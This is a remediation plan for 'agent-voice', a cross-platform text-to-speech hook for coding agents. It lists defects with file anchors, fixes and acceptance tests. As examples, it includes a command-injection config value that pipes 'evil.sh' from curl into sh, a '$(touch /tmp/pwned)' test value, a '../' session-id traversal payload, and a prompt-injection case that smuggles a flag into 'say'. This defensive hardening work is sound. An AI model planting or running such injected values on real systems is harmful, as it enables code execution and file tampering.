# agent-voice: Remediation Plan

**Status:** complete as of 2026-08-12 (commits R-01 through R-27 on main). Two
items remain open inside R-27 because they need a human: the 20-second audio
sample and the asciinema recording. R-08 note: this plan's claim that
install.sh already contained the Python window and venv was wrong; both
installers gained them together. R-10 was resolved by retraction.
**Scope:** every defect found in the 2026-08-11 review of commit `main` (28 commits, 26 files, ~3,340 LOC).
**Audience:** a coding agent working through this unattended, or a human delegating it.

## How to use this document

Tasks are ordered by dependency, not by severity. Do them in order. Each task has:

- an ID you can reference in commits (`fix: R-04 use BASHPID for speak pidfile`)
- exact `file:line` anchors, verified against the current tree
- the change to make
- an acceptance criterion that is mechanically checkable

Severity: **P0** blocks any public promotion of the repo. **P1** is a real defect a user will hit. **P2** is hygiene, correctness under unusual conditions, or maintainability.

**Do not skip R-01.** Every other fix in this document is unverifiable without it, which is how these defects survived 28 commits in the first place.

---

## Correction to an earlier review

An earlier pass reported six missing files (`lib/kokoro-voices.json`, `core/windows/pick-voice.ps1`, `core/windows/shush.ps1`, `shush.cmd`, `voice.cmd`, both uninstallers) as a P0. **That was wrong.** All six are present and correct. The finding was an artifact of an incomplete file staging, not a repo defect. Ignore any reference to it.

---

# Phase 0: make defects visible

## R-01 (P0) Add a test harness

**Problem:** 2,904 lines of code across three operating systems, four TTS engines and three agent config formats, with zero tests. Every fix below is currently unverifiable.

**Why it is first:** the four Node helpers are pure functions over stdin/argv. They are the highest-value, lowest-effort tests in the repo, and three of the P1 defects below are in code paths a test would have caught.

**Do:**

1. Add `package.json` at the repo root (Node is guaranteed present, every supported agent ships it):

```json
{
  "name": "agent-voice",
  "version": "0.1.0",
  "private": false,
  "type": "module",
  "license": "MIT",
  "scripts": {
    "test": "node --test test/",
    "lint:sh": "shellcheck install.sh uninstall.sh core/macos/*.sh",
    "lint:ps": "pwsh -NoProfile -File test/lint-ps.ps1"
  }
}
```

2. Create `test/` using the built-in `node:test` runner (no dependencies). Cover:

| File under test | Cases |
|---|---|
| `lib/extract-spoken.mjs` | last-match selection when the reply contains two `<spoken>` blocks; nested/unclosed tag; empty block; block with markdown characters; no block at all returns empty |
| `lib/json-get.mjs` | well-formed payload; the openai/codex#23784 unterminated-string payload; BOM-prefixed input; missing key returns empty |
| `lib/register.mjs` | install into empty file; install into a file with unrelated `Stop` hooks and top-level keys; install twice (no duplication); uninstall restores exactly; unparseable file is left untouched; **new:** a third-party hook whose path merely contains the string `agent-voice` survives (see R-09) |
| `lib/kimi-last-text.mjs` | last complete assistant text part; partial/streaming final part is skipped; empty transcript |
| `core/kokoro_serve.py` | `safe_output_path` rejects relative paths, parent-traversal, symlink escape; accepts a legitimate state-dir path; **new:** rejects a filename not matching `say.*.wav` (see R-06) |

3. `lib/register.mjs` must become testable. It currently executes on import. Wrap the bottom loop:

```js
if (import.meta.url === `file://${process.argv[1]}`) { main(); }
```

and export `mergeJson`, `mergeKimiToml`, `forms`.

4. Every test must run against a temporary `$HOME`, never the real one. See R-13, which makes this possible for the shell scripts too.

**Acceptance:** `npm test` passes on a clean checkout with no network access and does not touch `$HOME`.

---

## R-02 (P0) Add CI

**Problem:** no `.github/` directory. Nothing gates a broken commit.

**Do:** add `.github/workflows/ci.yml` with a matrix over `ubuntu-latest`, `macos-latest`, `windows-latest`:

- `npm test`
- `shellcheck` on every `.sh` (add a `.shellcheckrc` with any justified exclusions, do not blanket-disable)
- `bash -n` on every `.sh`
- PSScriptAnalyzer on every `.ps1`, plus a parse gate:
  `[System.Management.Automation.Language.Parser]::ParseFile($f, [ref]$null, [ref]$errs)`
- `python -m compileall core/`
- **A referenced-path check.** Grep the source for string literals that look like repo-relative paths and assert each exists. This is cheap and it is the class of bug that turns a working repo into a broken install.

**Acceptance:** CI is green on all three runners, and a deliberately introduced syntax error in any `.sh` or `.ps1` turns it red.

---

# Phase 1: defects users hit

## R-03 (P1) `settings.json` is overwritten non-atomically with no backup

**Where:** `lib/register.mjs:53-56`

```js
function writeJson(path, obj) {
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, JSON.stringify(obj, null, 2) + '\n');
}
```

**Problem:** a bare `writeFileSync` over the user's live `~/.claude/settings.json`. If the process is killed mid-write, or Claude Code reads the file at that moment, the user loses their entire agent configuration. This is the worst risk the project carries, because editing other tools' config files is the one thing agent-voice cannot avoid doing.

**Do:**

```js
function writeJson(path, obj) {
  mkdirSync(dirname(path), { recursive: true });
  const next = JSON.stringify(obj, null, 2) + '\n';
  if (existsSync(path)) {
    copyFileSync(path, path + '.agent-voice.bak');
  }
  const tmp = path + '.agent-voice.tmp';
  writeFileSync(tmp, next);
  renameSync(tmp, path);
}
```

Apply the same tmp+rename to `mergeKimiToml` at `lib/register.mjs:100`.

Print the backup path on first write so the user knows it exists. Do not overwrite an existing `.bak` on a subsequent run within the same install (keep the pre-agent-voice original), or use `.bak.<timestamp>`.

**Acceptance:** a test that kills the process between write and rename leaves the original file intact and parseable. `settings.json.agent-voice.bak` exists after a first install.

---

## R-04 (P1) macOS barge-in is broken and can kill unrelated processes

**Where:** `core/macos/speak.sh:82-83` and `:126`, `core/macos/shush.sh:9`

```bash
(
  echo $$ > "$pidfile"
```

**Problem:** `$$` inside a `( ... ) &` subshell is the **invoking** shell's PID, not the subshell's. So the pidfile always contains the PID of the hook process, which has already exited by the time line 126 runs. Consequences:

- "Cut off this session's previous turn if still speaking" (`speak.sh:78-79`) never fires. Overlapping speech on rapid turns.
- `shush.sh` kills a dead PID. It only appears to work because of the `killall afplay say` backstop at `shush.sh:12`.
- After PID reuse, `kill "$(cat "$pidfile")"` **terminates an unrelated user process**.

Note the Windows path is correct: `core/windows/speak.ps1:128` writes `$PID` from the process that actually does the speaking, because `speak.ps1` runs synchronously. This is a macOS-only defect.

**Do:**

1. `core/macos/speak.sh:83`: `echo $BASHPID > "$pidfile"`
2. Add an identity check before killing, on both platforms. A PID alone is not proof. Write `<pid> <starttime>` or, simpler and sufficient here, verify the process is one of ours before signalling:

```bash
# speak.sh, replacing line 79
if [ -f "$pidfile" ]; then
  old="$(cat "$pidfile" 2>/dev/null)"
  case "$old" in
    ''|*[!0-9]*) ;;
    *) if ps -p "$old" -o command= 2>/dev/null | grep -q 'speak.sh'; then kill "$old" 2>/dev/null; fi ;;
  esac
fi
```

3. `core/windows/speak.ps1:126` has the same stale-PID hazard via `Stop-Process -Id $old -Force`, as does `core/windows/shush.ps1:8`. Guard with a `(Get-Process -Id $old).StartTime` or process-name check before stopping.

**Acceptance:** on macOS, submitting a second prompt while the first reply is still speaking cuts the first off. A test that writes a foreign PID into the pidfile does not kill that process.

---

## R-05 (P1) Kokoro daemon token file is world-readable, and the README says otherwise

**Where:** `core/kokoro_serve.py:205-207`; state dir created at `core/macos/speak.sh:8` and `core/macos/voice-context.sh:11`

```python
tmp = port_file.with_suffix(".port.tmp")
tmp.write_text(f"{sock.getsockname()[1]} {token}", encoding="utf-8")
os.replace(tmp, port_file)
```

**Problem:** no `chmod` anywhere in the file. Under the default umask this lands at `0644`. `README.md:245-246` claims the daemon "requires a token from a file **only your account can read**". On any multi-user machine, another local user reads the token and can drive the synthesiser.

The rest of the daemon's security model is sound: loopback-only bind (`:200`), `secrets.token_hex(16)` (`:203`), `secrets.compare_digest` (`:127`), symlink-resolving path allowlist (`:91-102`), atomic port-file publish (`:207`). This single omission undermines all of it.

**Do:**

```python
tmp = port_file.with_suffix(".port.tmp")
fd = os.open(tmp, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
with os.fdopen(fd, "w", encoding="utf-8") as fh:
    fh.write(f"{sock.getsockname()[1]} {token}")
os.replace(tmp, port_file)
```

Creating with `0o600` rather than chmod-after-write closes the window where the file exists readable.

Also set the state directory to `0700` at creation, in all four places it is created (`speak.sh:8`, `voice-context.sh:11`, and the PowerShell equivalents). On Windows, set an explicit ACL granting only the current user.

**Acceptance:** `stat -f '%Lp' ~/.agent-voice/state/kokoro.port` returns `600`, and the state dir returns `700`. Update `README.md:245` only after this is true.

---

## R-06 (P1) Daemon output path allows overwriting its own control files

**Where:** `core/kokoro_serve.py:91-102`

**Problem:** `safe_output_path` constrains the **directory** but not the **filename**. A request holding the token can write WAV bytes over `kokoro.port`, `kokoro.lock`, `voice-on`, or any per-session flag in the state dir. Lower severity than R-05 (it requires the token first), but it turns a read of the token into a denial of service.

**Do:** add a filename allowlist:

```python
import re
_OUT_NAME = re.compile(r"^say\.[A-Za-z0-9_.-]{1,128}\.wav$")

def safe_output_path(state, raw):
    path = Path(raw)
    if not path.is_absolute():
        return None
    if not _OUT_NAME.match(path.name):
        return None
    try:
        if path.resolve().parent != state.resolve():
            return None
    except OSError:
        return None
    return path
```

While here, add two cheap limits to `serve` (`:105`):

- reject a `text` field over ~8 KB (currently unbounded CPU on a single-threaded accept loop)
- reject a request body over ~64 KB before parsing

**Acceptance:** a request with `out` set to `<state>/kokoro.port` is rejected. A 100 KB `text` is rejected. Both covered by tests from R-01.

---

## R-07 (P1) Windows blocks Codex and Kimi for the whole duration of speech

**Where:** `lib/register.mjs:104-109`

```js
claude: () => mergeJson(join(home, '.claude', 'settings.json'),
                        ups && ups.argv, stop && stop.argv, platform === 'win' ? { async: true } : {}),
codex:  () => mergeJson(join(home, '.codex', 'hooks.json'),
                        ups && { command: ups.single }, stop && { command: stop.single }, {}),
```

**Problem:** `async: true` is applied only to the `claude` provider. Unlike `speak.sh`, which backgrounds everything in a `( ... ) &` (`speak.sh:81`, `:127`), `speak.ps1` never backgrounds: `Play-Mp3` uses `mciSendString("play $al wait")` (`:139`), `Play-Wav` uses `PlaySync()` (`:149`), and the SAPI fallback uses `Speak()` (`:208`). A Codex or Kimi user on Windows therefore waits through the entire spoken summary before the agent returns control.

This is the largest undocumented behavioural asymmetry in the project.

**Do:** **take approach (b).** This is no longer a preference. Hook-contract research on 2026-08-11 (see `ENHANCEMENT_PLAN.md` section 7) found that **no other agent supports async hooks at all**: Claude Code's `async: true` is unique, Gemini CLI explicitly waits for every hook, Cursor offers only a timeout, and opencode and Amp both fully await their handlers. Approach (a) therefore does not generalise past one agent, and every agent added in Phase 6 would stall the user for the full duration of speech.

**(a)** ~~Set `async: true` for Codex too, if the Codex hook schema supports it.~~ Rejected, see above. Kimi's flat `[[hooks]]` TOML has no async concept either, so it never solved Kimi.

**(b)** Make `speak.ps1` background its own work, matching the macOS design. Wrap the synthesis and playback in `Start-Process powershell -WindowStyle Hidden` or a `Start-Job`, write the pidfile from inside that child (which also keeps R-04's Windows path correct), and return immediately. Then `async` becomes irrelevant on all three providers and the platforms behave the same.

**Acceptance:** on Windows, a Codex turn and a Kimi turn both return in under 500 ms with speech continuing afterwards. Measure it, do not assume it.

---

## R-08 (P1) Windows installer is missing the Kokoro Python ceiling and the venv

**Where:** `install.ps1:162-163`, `:153-159`, `:220`, `:231-232`, `:268`

```powershell
$PyMinEdge   = '3.9'
$PyMinKokoro = '3.10'
```

**Problem:** `install.sh:173` defines `PY_MIN_KOKORO="3.10"` **and** `PY_MAX_KOKORO="3.12"`, and `find_python` (`:179`) plus `python_for` (`:207-209`) enforce both ends, because Kokoro declares `Requires-Python >=3.10,<3.13`. `install.ps1` has a floor-only check. A Windows user on Python 3.13, increasingly the default, walks straight into the `blis`/`thinc` source-build failure that `install.sh:158-171` and `README.md:162-167` describe at length as the trap to avoid. On the platform the README calls best-tested.

Compounding it, `install.ps1:232` runs `python -m pip install --user kokoro soundfile` with **no `$LASTEXITCODE` check** and no virtualenv. `install.sh:196-205` builds a private venv at `~/.agent-voice/venv` specifically to dodge PEP 668 and PATH bleed. Windows never got that. `--user` is also refused outright by Store and MSYS2 Pythons. Same problem for edge-tts at `install.ps1:268`.

**Do:**

1. Add `$PyMaxKokoro = '3.12'` and make `Test-Python` take a range. Port the newest-first sweep from `install.sh:179-191`, including the behaviour of **rejecting an interpreter that is too new** rather than handing back one that will fail deep inside pip.
2. Name the range in the error, as `install.sh` does. The user's instinct on a version error is to install the newest Python, which makes it worse.
3. Build a venv at `~/.agent-voice/venv` on Windows too, and write `python_cmd` pointing into it. This is not optional polish, it is the difference between the hooks finding their dependencies and silently degrading to the robotic voice.
4. Check `$LASTEXITCODE` after every `pip install` and fail loudly.

**Acceptance:** on a Windows box with only Python 3.13, the installer refuses Kokoro with a message naming 3.10 to 3.12, and does not attempt the install. On a box with 3.12, `~/.agent-voice/venv` exists and `config` contains a `python_cmd` inside it.

---

## R-09 (P1) Hook ownership is detected by substring match

**Where:** `lib/register.mjs:66`

```js
const ours = g => JSON.stringify(g).includes(MARK);
```

**Problem:** any third-party hook group whose serialised JSON happens to contain the string `agent-voice` is treated as ours and silently deleted on install or uninstall. A user with a repo at `~/projects/agent-voice` and an unrelated hook referencing that path loses it with no warning.

**Do:** write an explicit marker into our own entries and match on that, keeping the substring check only as a migration path for entries written by older versions:

```js
// when installing
{ type: 'command', ...upsEntry, timeout: 10, _agentVoice: 'agent-voice@' + VERSION }

// when detecting
const ours = g => {
  const hooks = (g && g.hooks) || [];
  if (hooks.some(h => h && h._agentVoice)) return true;
  return JSON.stringify(g).includes(MARK);  // legacy entries, remove in v2
};
```

Verify Claude Code tolerates the extra key. If it does not, use a `// agent-voice` sentinel in the command string instead, which it must preserve verbatim.

**Acceptance:** a test installs alongside a foreign hook whose command path contains `agent-voice`, runs uninstall, and asserts the foreign hook survives.

---

## R-10 (P1) Linux is advertised and does not work

**Where:** `README.md:183`, `install.sh:2`, `install.sh:21`, `install.sh:359,361`; playback at `core/macos/speak.sh:95,104,114,123`, `core/macos/pick-voice.sh:39`, `core/macos/shush.sh:12`

**Problem:** the README offers a Linux install path and `install.sh` prints `apt-get` advice, but it copies `core/macos/*` verbatim and every playback call is `afplay`, with `say` as the universal fallback. Neither exists on Linux. There is no `aplay`, `paplay`, `ffplay` or `spd-say` anywhere in the tree. **On Linux the installer completes cheerfully and every reply is silent, forever, with no error.**

That is the worst possible failure mode: it looks like it worked.

**Do:** pick one and be honest about it.

**(a) Implement it.** Add a player-resolution function used by `speak.sh`, `pick-voice.sh` and `shush.sh`:

```bash
av_play() {  # av_play <file>
  case "$(uname -s)" in
    Darwin) afplay "$1" ;;
    *) for p in paplay aplay ffplay mpv; do
         command -v "$p" >/dev/null 2>&1 || continue
         case "$p" in
           ffplay) ffplay -nodisp -autoexit -loglevel quiet "$1" ;;
           mpv)    mpv --really-quiet --no-video "$1" ;;
           *)      "$p" "$1" ;;
         esac
         return $?
       done
       return 1 ;;
  esac
}
```

The `say` fallback at `speak.sh:123` needs a Linux equivalent (`spd-say`, or `espeak-ng`, which is already bundled via `espeakng-loader`). Note `aplay` handles WAV only, so on the edge-tts and ElevenLabs MP3 paths it must be excluded or the file transcoded. The installer must detect at install time and refuse, loudly, if no player is available.

**(b) Delete the claim.** Change `README.md:183` to "macOS", change `install.sh:2`, and have `install.sh` exit with a clear message on `uname -s` other than `Darwin`, pointing at an issue for Linux support.

Do (b) today if (a) is not going to happen this month. A false claim is worse than a missing feature.

**Acceptance:** either a Linux CI runner speaks a test phrase, or `bash install.sh` on Linux exits non-zero with an explanatory message.

---

# Phase 2: security hardening

## R-11 (P2) The config file is sourced as shell

**Where:** `core/macos/speak.sh:10-11`

```bash
# Load config (simple key=value file; safe to source, values have no spaces).
[ -f "$ROOT/config" ] && . "$ROOT/config"
```

**Problem:** the comment is false. `install.sh:411-412` writes `eleven_voice=$vid` straight from an unvalidated paste, and `README.md:349` actively invites hand-editing. A value of `x$(curl evil.sh|sh)` executes on **every reply**. Self-inflicted rather than remotely exploitable, but it is the kind of thing a security-minded reviewer bounces on, and you already have the fix in the tree.

`core/macos/voice-context.sh:18` already parses the same file safely with `sed`, and `uninstall.sh:9` has a clean `cfg_read` helper.

**Do:** extract `cfg_read` from `uninstall.sh:9` into a small sourced library, or duplicate it, and replace the `.` at `speak.sh:11` with explicit reads of the known keys. There are 11 of them, listed at `README.md:352-360`. Never source a file the user is told to edit.

**Acceptance:** a config containing `eleven_voice=x$(touch /tmp/pwned)` does not create `/tmp/pwned` after a reply.

---

## R-12 (P2) ElevenLabs key is exposed on the process command line

**Where:** `core/macos/speak.sh:112-113`

```bash
curl -s -X POST "https://api.elevenlabs.io/..." \
  -H "xi-api-key: $key" ...
```

**Problem:** the key is visible to any process running as the same user, via `ps` or `/proc/*/cmdline`, on every single reply.

**Do:** pass it via a config file on stdin:

```bash
printf 'header = "xi-api-key: %s"\n' "$key" | curl -s --config - \
  -X POST "$url" -H 'Content-Type: application/json' -d "$body" -o "$mp3"
```

Related, same task:

- `install.sh:409` correctly does `chmod 600` on the key file. `install.ps1:213` writes it with inherited ACLs. Set an explicit user-only ACL on Windows.
- `install.ps1:212` converts a `SecureString` to a BSTR and never calls `ZeroFreeBSTR`, leaving the plaintext key in process memory. Add the free.

**Acceptance:** `ps auxww` during a reply shows no key. The key file is `600` on macOS and user-only ACL on Windows.

---

## R-13 (P2) `session_id` is unvalidated before path and AppleScript use

**Where:** `core/macos/voice-context.sh:62-66` and `:126`

**Problem:** `sid` comes from the agent's JSON payload and is used to build `$STATE/on.$sid`, `$STATE/off.$sid` and friends. `voice off` does `: > "$off_flag"`, so a `sid` containing `../` truncates an arbitrary file. Separately, `:126` interpolates `$sid` and `$cur_engine` through two layers of quoting into an `osascript -e "tell application \"Terminal\" to do script \"...'$sid'...\""`.

Session ids are agent-generated UUIDs in practice, so this is not currently exploitable. It is one line to close permanently, and it stops being true the moment a new agent is added.

**Do:** at the top of `voice-context.sh` and `speak.sh`, immediately after parsing:

```bash
case "$sid" in
  ''|*[!A-Za-z0-9_-]*) sid="nosession" ;;
esac
```

Same in the PowerShell equivalents (`-notmatch '^[A-Za-z0-9_-]+$'`). Prefer clamping to `nosession` over exiting, so a malformed id degrades to shared state rather than silently doing nothing.

**Acceptance:** a payload with `session_id: "../../../etc/x"` creates no file outside the state dir.

---

## R-14 (P2) Model output reaches `say` in a flag position

**Where:** `core/macos/speak.sh:123`

```bash
if [ -n "${native_voice:-}" ]; then say $say_args -v "$native_voice" "$spoken"; else say $say_args "$spoken"; fi
```

**Problem:** `lib/extract-spoken.mjs:15` strips backticks, asterisks, hashes, underscores, angle brackets and pipes (`.replace(/[\`*#_>|]/g, '')`), but not a leading hyphen. A reply containing `<spoken>-o /tmp/x.aiff hello</spoken>` makes `say` parse `-o` as a flag and write a file instead of speaking. Reachable via prompt injection in a repo the agent reads.

Low impact, trivially fixed. This is the **only** place untrusted model output reaches an argv position that can be read as a flag. Everything else is correctly flag-attached (`--text "$spoken"`, `-d "$body"`), and `lib/eleven-body.mjs` builds JSON with `JSON.stringify` rather than concatenation, which is right.

**Do:** add `--` before the text on both branches. Also strip a leading `-` in `extract-spoken.mjs` for defence in depth.

**Acceptance:** a `<spoken>` block beginning `-o /tmp/x.aiff` speaks the literal text and creates no file.

---

## R-15 (P2) `shush` kills processes it does not own

**Where:** `core/macos/shush.sh:12`

```bash
killall afplay say 2>/dev/null
```

**Problem:** kills every `afplay` and `say` the user has running, including from unrelated applications and scripts.

**Do:** once R-04 makes the pidfiles correct, this backstop can be narrowed to killing the tracked process group only, or removed. If keeping a backstop, scope it by checking the parent process before signalling.

**Acceptance:** an unrelated `afplay` started by hand survives `voice stop`.

---

## R-16 (P2) Windows uninstall leaves the Kokoro daemon resident

**Where:** `uninstall.ps1:7`

```powershell
if (Test-Path $serve) { python $serve (Join-Path $target 'state') --quit 2>$null }
```

**Problem:** uses bare `python`, not the `python_cmd` recorded in config. `uninstall.sh:6-11` has a nine-line comment explaining exactly why that is wrong: the dependencies live in a private environment, a bare interpreter cannot import kokoro, and the quit silently no-ops, **leaving ~1.7 GB resident after the user thinks they uninstalled**. The macOS fix was made and never ported.

This becomes strictly necessary once R-08 introduces a venv on Windows.

**Do:** port `cfg_read` and the `python_cmd` resolution from `uninstall.sh:9-11` to `uninstall.ps1`.

**Acceptance:** after `uninstall.ps1` on a Kokoro install, no `python` process holding the model remains.

---

# Phase 3: correctness under unusual conditions

## R-17 (P2) Culture-sensitive number parsing on Windows

**Where:** `core/windows/speak.ps1:90,95` and `core/windows/voice-context.ps1:414`

**Problem:** `[double]::TryParse($s, [ref]$v)` uses the **current culture**. On a `de-DE` or `fr-FR` machine, `voice speed 1.5` parses as `15` and fails the 0.5 to 2.0 range check, while `1,5` succeeds.

Meanwhile the default-speed reads at `voice-context.ps1:89,91,93` and the comparison at `:401` use a `[double]` **cast**, which is culture-**invariant**. So two different number parsers coexist and disagree: a `de-DE` user can have `voice_speed=1.5` in config work fine via the cast, while `voice speed 1.5` typed in-session is rejected.

**Do:**

```powershell
[double]::TryParse($s, [Globalization.NumberStyles]::Float,
                   [Globalization.CultureInfo]::InvariantCulture, [ref]$v)
```

everywhere, and audit for any other `TryParse` or `ToString` on a number that reaches the config file.

**Acceptance:** with `Set-Culture de-DE`, `voice speed 1.5` is accepted and `voice status` reports `1.5`.

---

## R-18 (P2) Mixed `return` and `exit` in the same function

**Where:** `core/macos/voice-context.sh:338,341,344` use `exit 2`; eleven other branches in the same `case` use `return 2`

**Problem:** it works only because `handle_command` is invoked inside a command substitution at `:371`, which runs in a subshell. Refactor that away and those three branches silently block the user's prompt with no output. A latent trap for the next contributor, which is exactly who this repo is trying to attract.

**Do:** make all branches `return`. Handle the exit code once at the call site.

**Acceptance:** all `exit` calls inside `handle_command` are gone; behaviour unchanged.

---

## R-19 (P2) Daemon lock mtime is never refreshed

**Where:** `core/kokoro_serve.py:68-89` (`take_lock`), constant at `:29`

**Problem:** `take_lock` compares the lock's mtime against `STARTUP_GRACE` (180 s) to decide whether another daemon is mid-startup (`:82`), but the mtime is never touched after creation (`:73-75`). Currently guarded by the `daemon_alive` check so it does not misbehave, but the invariant is not what the code reads as.

**Do:** either touch the lock periodically in the accept loop, or delete the grace logic and rely solely on `daemon_alive`. Prefer the latter, it is less machinery.

**Acceptance:** a stale lock from a killed daemon is taken over on the next synthesis without a 180 s wait.

## R-20 (P2) Plist heredoc is not XML-escaped

**Where:** `install.sh:273`

**Problem:** `$TARGET` is interpolated into an XML plist with no escaping. A `$HOME` containing `&`, `<` or `>` produces a malformed Quick Action that fails silently.

**Do:** escape the five XML entities before interpolation, or build the plist with `plutil`.

**Acceptance:** installing under a home directory named `a&b` produces a working Quick Action.

---

# Phase 4: project scaffolding

These do not fix defects. They are what turns a public repo into one a stranger will trust.

| ID | Item | Note |
|---|---|---|
| R-21 | `VERSION` constant, single source | There is currently no version string anywhere. The installer cannot report what it installed and `register.mjs` cannot detect an upgrade. Blocks R-09's marker and any migration logic. |
| R-22 | `CHANGELOG.md` | The history currently lives in code comments ("This used to be...") and `README.md:41-60`. Move it. |
| R-23 | `SECURITY.md` | This project edits agent configs, stores an API key, runs a local daemon and executes on every model reply. It needs a disclosure policy. |
| R-24 | `CONTRIBUTING.md` | Cover: bash 3.2 constraint (macOS ships it, see the `eval "sel_$k=1"` idiom at `install.sh:67,122`), how to run tests against a fake `$HOME`, the macOS/Windows parity rule. |
| R-25 | Issue and PR templates | Must ask for OS, agent, engine, and `voice status` output. Most reports will be unreproducible without those four. |
| R-26 | `.editorconfig`, `.shellcheckrc`, `PSScriptAnalyzerSettings.psd1` | Cheap, and stops style churn in PRs. |
| R-27 | Restructure the README | See below. |

## R-27: the README is working against you

`README.md` is 419 lines and contains a dated defect postmortem (`:41-60`), a verification log (`:62-87`), benchmark tables (`:230-234`) and a full config reference. The candour is a genuine asset and should survive, but a stranger reading "Fixed on macOS on 2026-08-10, after a real install attempt on a Mac" concludes the project was broken last week.

**Do:**

- Move `:41-60` (the defect postmortem) to `CHANGELOG.md`.
- Move `:62-87` (the verification log) to `docs/PLATFORM-STATUS.md`, and keep a three-line summary table in the README.
- Move `:228-258` (benchmarks and daemon internals) to `docs/PERFORMANCE.md`.
- Move `:340-373` (config reference) to `docs/CONFIGURATION.md`.
- Keep the README under 120 lines: what it does, a 20-second audio sample, install, the ten daily commands, links.
- **Add an audio sample or asciinema recording.** For a tool whose entire value proposition is audible, this will do more for adoption than the other 419 lines combined.

The extensive inline rationale comments (`install.sh:138-155`, `:158-171`, `voice-context.sh:374-391`) are genuinely excellent content in the wrong place. They triple the reading cost of the control flow. Move the reasoning to `docs/DESIGN.md` and leave a one-line pointer.

---

# Execution order

```
R-01  tests                    <- everything below is unverifiable without this
R-02  CI
   |
R-03  atomic config write      <- highest user-facing risk
R-04  BASHPID + identity check
R-05  token file mode
R-06  output path allowlist
R-07  Windows async / backgrounding
R-08  Windows Python ceiling + venv
R-09  explicit hook marker
R-10  Linux: implement or retract   <- decide today, retract if not implementing
   |
R-11 .. R-16  security hardening
R-17 .. R-20  correctness
   |
R-21 .. R-27  scaffolding and docs
```

R-03 through R-10 are roughly two days of work with the tests in place. Do not start the enhancement plan before R-10 is closed.

---

# What is already right

Preserve these through any refactor. They are the parts that make the project worth continuing.

- **`lib/extract-spoken.mjs:9`.** The `<spoken>((?:(?!<spoken>)[\s\S])*?)<\/spoken>` pattern with last-match selection at `:13-15`, and the five-line comment at `:4-8` explaining why a naive non-greedy match reads the whole reply aloud. The entire file is 17 lines and there is nothing wasted in it. Correctly mirrored at `core/windows/speak.ps1:111`.
- **`lib/json-get.mjs` salvage path.** Regex-scraping an unterminated JSON string to work around [openai/codex#23784](https://github.com/openai/codex/issues/23784), with the BOM strip for PowerShell's piped stdin. Verified working against a reproducing payload.
- **The Kokoro daemon architecture** (`core/kokoro_serve.py`). Loopback bind on an OS-assigned port, `compare_digest`, symlink-resolving path allowlist, atomic port publish, model loaded before the port is advertised so connect-implies-ready, `O_EXCL` single-daemon lock with stale takeover, self-termination after 15 idle minutes. Modulo R-05 and R-06, this is a better local IPC design than most projects ship.
- **The never-silent fallback chain.** Every engine checks whether playback actually happened rather than assuming, with a size sanity check, and falls through to the OS voice. "Degrades to sounds basic, not silent" is the right call and it is implemented consistently.
- **`lib/register.mjs` idempotency.** Verified: install, reinstall, uninstall against a `settings.json` with unrelated hooks and top-level keys preserves everything, never duplicates, cleans up empty `hooks` objects, and refuses to touch an unparseable file (`:51`) rather than clobbering it.
- **`install.sh` Python resolution** (`find_python`, `:179-191`). Sweeping newest-first within a bounded window and rejecting an interpreter that is too new, plus the private venv to dodge PEP 668. This reflects a real debugging session, not guesswork. R-08 is only asking you to port it.
- **Per-session state keyed on `session_id`,** with per-engine voice overrides so a Kokoro id cannot leak into edge-tts (`speak.sh:50`), and one 0.5 to 2.0 speed scale that each engine converts to its own units.
- **Bash 3.2 compatibility.** The `eval "sel_$k=1"` idiom instead of associative arrays is ugly and it is the correct choice for the bash macOS actually ships.
